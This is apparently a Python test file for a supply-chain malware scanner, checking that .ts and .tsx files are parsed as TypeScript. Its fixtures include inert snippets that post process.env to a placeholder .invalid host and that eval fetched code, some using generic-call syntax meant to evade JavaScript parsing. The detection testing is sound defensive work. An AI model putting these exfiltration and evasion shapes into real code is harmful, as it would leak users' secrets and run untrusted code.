"""TS-STRIP (0.1.9, rule set 2.93.0): a TypeScript file is read by the supply-chain tests in its own dialect.

The hosts handed the engine a .ts, .tsx, .mts or .cts file's text alone, as JavaScript, and the supply-chain tree
read it as JavaScript (with JSX and Flow's annotations) first, then as TypeScript without JSX. No reading was
TypeScript with JSX, so a .tsx file with TypeScript's own syntax was refused (Vite's stock main.tsx, for its
`document.getElementById('root')!`): SC-UNPARSED-CODE, and the tree's tests read only its text. Worse, JavaScript
first read a .ts file's call given a type, `post<object>(url, process.env)`, as `(post < object) > (url,
process.env)` with no refusal: the tree found nothing, and the text followers were not asked. The same send without
the type is CRITICAL.

Now each call that reaches the tree takes the file's name (core.import_time_risk, install_script_risk and
js_refusal's `path`; the engine's `dialect`, engine.dialect_args): a .ts, .mts or .cts file is read as TypeScript, a
.tsx file as TypeScript with JSX, in that dialect alone. A JavaScript file, and a text whose file is not known, is
read as it was.

Payloads are inert text: hosts are .invalid, nothing is run.
"""
import unittest

from tests import _support  # noqa: F401
from lazaret.scanner import _native, core, engine

JSX = "\nexport const el = <div className=\"x\">hi</div>;\n"
VITE_MAIN = ("import React from 'react'\nimport ReactDOM from 'react-dom/client'\nimport App from './App.tsx'\n"
             "ReactDOM.createRoot(document.getElementById('root')!).render(\n  <React.StrictMode>\n    <App />\n"
             "  </React.StrictMode>,\n)\n")

# TypeScript's syntax in a file with JSX that both earlier readings refused (TS-STRIP's probe: 18 of its 52
# constructs; the other 34, types and modifiers Flow's reading or TypeScript's without JSX read, are read still)
REFUSED = [
    ("non-null `!` (Vite's main.tsx)", VITE_MAIN),
    ("as", "const x = (window as any).foo;" + JSX),
    ("as const", "const xs = ['a', 'b'] as const;" + JSX),
    ("satisfies", "const c = { a: 1 } satisfies Record<string, number>;" + JSX),
    ("a generic arrow", "const id = <T,>(x: T): T => x;" + JSX),
    ("a generic arrow with a bound", "const id = <T extends object>(x: T) => x;" + JSX),
    ("enum", "enum Color { Red, Green }" + JSX),
    ("namespace", "namespace NS { export const a = 1; }" + JSX),
    ("declare module", "declare module 'foo' { export const a: number; }" + JSX),
    ("declare global", "declare global { interface Window { x: number } }" + JSX),
    ("overloads", "function f(a: string): string;\nfunction f(a: number): number;\nfunction f(a: any) { return a; }"
     + JSX),
    ("a definite assignment", "let x!: number;" + JSX),
    ("a definite field", "class A { x!: number }" + JSX),
    ("a class's index signature", "class A { [k: string]: unknown }" + JSX),
    ("useState<number[]>([])", "const [xs, setXs] = useState<number[]>([]);" + JSX),
    ("new Map<K, V>()", "const m = new Map<string, number>();" + JSX),
    ("a?.b<T>()", "const r = a?.b<string>();" + JSX),
    ("a generic JSX component", "export const el = <List<string> items={[]} />;\n"),
]

ENV_SENT = "reads credentials or the whole environment and sends data over the network"
RECEIVED_RUN = "runs code it receives over the network"
# the shapes JavaScript-first read as comparisons, each with its twin without the type (found either way)
EVASIONS = [
    ("import axios from 'axios';\naxios.post{t}('https://x.invalid/c', process.env);\n", "<Resp>", ENV_SENT),
    ("import {{ post }} from 'axios';\npost{t}('https://x.invalid/c', process.env);\n", "<object>", ENV_SENT),
    ("function getJSON<T>(u: string) {{ return fetch(u).then((r) => r.text()); }}\n"
     "getJSON{t}('https://x.invalid/p').then(eval);\n", "<string>", RECEIVED_RUN),
    ("class Sender<T> {{ constructor(u: string, d: T) {{\n"
     "  fetch(u, {{ method: 'POST', body: JSON.stringify(d) }}); }} }}\n"
     "new Sender{t}('https://x.invalid/c', process.env);\n", "<object>", ENV_SENT),
]


class DialectTests(unittest.TestCase):
    def test_the_dialect_of_a_files_name(self):
        for path, dialect in (("a.ts", "ts"), ("src/a.MTS", "ts"), ("a.cts", "ts"), ("App.tsx", "tsx"),
                              ("a.js", None), ("a.mjs", None), ("a.cjs", None), ("a.jsx", None), ("bin/cli", None),
                              ("", None), (None, None)):
            with self.subTest(path):
                self.assertEqual(engine.js_dialect(path), dialect)
                self.assertEqual(engine.dialect_args(path), {"dialect": dialect} if dialect else {})

    def test_the_scans_calls_say_it(self):
        # (scan_file's decoded-payload flow reads the tree: its key, the call's arguments, says the dialect)
        calls = engine.scan_calls([("a.ts", "x", "js", True), ("App.tsx", "x", "js", True), ("a.js", "x", "js", True),
                                   ("a.py", "x", "py", True)])
        self.assertEqual([c[1].get("dialect") for c in calls], ["ts", "tsx", None, None])
        self.assertEqual([c[1]["jsx"] for c in calls], [False, True, True, True])

    def test_the_engine_takes_three_dialects(self):
        self.assertIsNone(_native.call("js_refusal", {"dialect": "js"}, "const a = 1;\n"))
        with self.assertRaises(_native.NativeError):
            _native.call("js_refusal", {"dialect": "flow"}, "const a = 1;\n")


class TsxReadTests(unittest.TestCase):
    def test_typescript_syntax_with_jsx_is_read(self):
        for name, text in REFUSED:
            with self.subTest(name):
                # (a text whose file is not known is read as before: JavaScript first, then TypeScript without JSX)
                self.assertIsNotNone(core.js_refusal(text), "refused before")
                self.assertIsNone(core.js_refusal(text, "src/App.tsx"))
                ((_reasons, _line, refused),) = engine.import_time_risks([(text, "js", "src/App.tsx")], refused=True)
                self.assertIsNone(refused)

    def test_a_refusal_is_the_dialects_own(self):
        # JSX in a .ts file is no TypeScript (`<T>x` is a type assertion there): refused at its line, as tsc does
        text = "const a = 1;\nexport const el = <div>hi</div>;\n"
        self.assertIsNone(core.js_refusal(text))
        self.assertIsNone(core.js_refusal(text, "a.tsx"))
        self.assertEqual(core.js_refusal(text, "a.ts")[0], 2)
        ((_reasons, _line, refused),) = engine.import_time_risks([(text, "js", "a.ts")], refused=True)
        self.assertEqual(refused[0], 2)


class GenericCallTests(unittest.TestCase):
    def test_a_call_given_a_type_is_a_call(self):
        for shape, given, reason in EVASIONS:
            typed, plain = shape.format(t=given), shape.format(t="")
            with self.subTest(typed.splitlines()[-1]):
                for path in ("index.ts", "index.mts", "index.cts", "App.tsx"):
                    self.assertIn(reason, core.import_time_risk(typed, "js", path=path)[0], path)
                    self.assertIn(reason, core.import_time_risk(plain, "js", path=path)[0], path)
                self.assertEqual(core.import_time_severity([reason]), "CRITICAL")

    def test_a_javascript_file_keeps_javascripts_reading(self):
        # in JavaScript `a<b>(c)` is two comparisons: no call, no send (and the text whose file is not known is read so)
        for shape, given, reason in EVASIONS[:2]:
            typed = shape.format(t=given)
            with self.subTest(typed.splitlines()[-1]):
                for path in (None, "index.js", "index.mjs", "index.cjs", "index.jsx"):
                    self.assertNotIn(reason, core.import_time_risk(typed, "js", path=path)[0], path)
        self.assertEqual(core.import_time_risk("const r = a<b>(c);\n", "js", path="a.js"), ([], None))

    def test_install_scripts_and_dependency_files(self):
        typed = EVASIONS[1][0].format(t="<object>")
        sent = "sends environment variables over the network (the whole environment)"
        self.assertEqual(core.install_script_risk(typed, lang="js", path="scripts/postinstall.ts"), [sent])
        self.assertEqual(core.install_script_risk(typed, lang="js", path="scripts/postinstall.js"), [])
        # --deps: a dependency's file no hook runs
        issue = core.dependency_import_issue("node_modules/x/index.ts", typed, "js")
        self.assertEqual((issue["rule"], issue["sev"]), ("SC-IMPORT-RISK", "CRITICAL"))
        self.assertIsNone(core.dependency_import_issue("node_modules/x/index.js", typed, "js"))


if __name__ == "__main__":
    unittest.main()
